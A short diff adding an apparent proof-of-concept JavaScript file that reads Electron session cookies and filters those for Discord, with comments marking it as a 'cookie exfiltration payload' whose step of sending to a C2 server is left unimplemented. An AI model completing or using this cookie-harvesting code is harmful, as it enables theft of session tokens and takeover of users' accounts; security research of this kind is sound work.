@@ -1,0 +1,11 @@
+// Cookie exfiltration payload (concept, not executed)
+const { session } = require('electron');
+session.defaultSession.cookies.get({})
+    .then(cookies => {
+        // Filter discord.com cookies
+        const discordCookies = cookies.filter(
+            c => c.domain.includes('discord')
+        );
+        // Send to C2 server
+        // (not implemented in PoC for ethical reasons)
+    });
